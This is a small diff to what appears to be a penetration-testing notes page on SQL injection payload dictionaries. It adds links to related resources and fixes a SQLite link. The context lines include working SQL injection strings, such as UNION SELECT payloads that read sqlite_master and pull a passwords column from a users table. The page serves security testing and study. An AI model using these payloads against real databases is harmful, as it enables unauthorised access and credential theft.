@@ -12,6 +12,11 @@ tags:
     - See a more detailed [explanation about SQL injection](webexploitation/sql-injection.md).
     - [PayloadsAllTheThings Original payloads for different SQL databases](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).
 
+!!! tip "Related resources"
+	- [Detailed SQLi Cheat sheet for manual attack](sqli-manual-attack.md).
+	- [SQL injection](webexploitation/sql-injection.md)
+	- [NoSQL injection](webexploitation/nosql-injection.md)
+	- [SQLite injections](webexploitation/sqlite-injections.md)
 
 ??? quote "OWASP"
 	[OWASP Web Security Testing Guide 4.2](OWASP/index.md) > 7. Data Validation Testing > 7.5. Testing for SQL Injection
@@ -28,7 +33,7 @@ tags:
 	| [MSSQL](mssql.md) | [MSSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MSSQL%20Injection.md). |
 	|  [PostgreSQL](5432-postgresql.md) | [PostgreSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/PostgreSQL%20injection.md). |
 	|  [Oracle](1521-oracle-transparent-network-substrate.md) | [Oracle SQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Oracle-SQL-injections.md). |
-	| [SQLite](sqlite.md) | [SQLite payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/SQLite-injection.md). | 
+	| [SQLite](sqlite-injections.md) | [SQLite payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/SQLite-injection.md). | 
 	| Cassandra | [Cassandra payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Cassandra%20Injection.md). | 
 
 ??? example "Attack-based dictionaries"
@@ -201,7 +206,6 @@ a' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --
 1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM users;#
 
 1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM <databaseName.tableName>;#
-
 ```
 
 
